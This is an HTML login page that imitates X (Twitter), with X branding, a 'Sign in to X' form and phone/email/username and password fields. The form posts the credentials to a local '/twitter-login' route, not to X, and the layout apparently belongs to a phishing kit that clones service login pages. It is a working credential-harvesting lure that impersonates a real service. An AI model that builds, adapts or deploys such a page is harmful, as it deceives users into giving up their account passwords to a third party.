<html>
	<head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <link rel="stylesheet" href="/static/css/twitter.css">
		<title>Log in to X</title>
	</head>
	<body>

		<div class="container">
            <div>
                <img src="../static/images/twitter/logo.png" class="logo" alt="X"/>
            </div>
			<form action="/twitter-login" method="post">
					<h1>Sign in to X</h1>
				<div class="box">
					<input type="text" name="username" placeholder="Phone, email, or username"></input>
				</div>
				<div class="box">
					<input type="password" name="password" placeholder="Password"></input>
				</div>
				<div>
					<button type="submit" class="login-btn">Sign in</button>
				</div>
			</form>
		</div>
	</body>
</html>
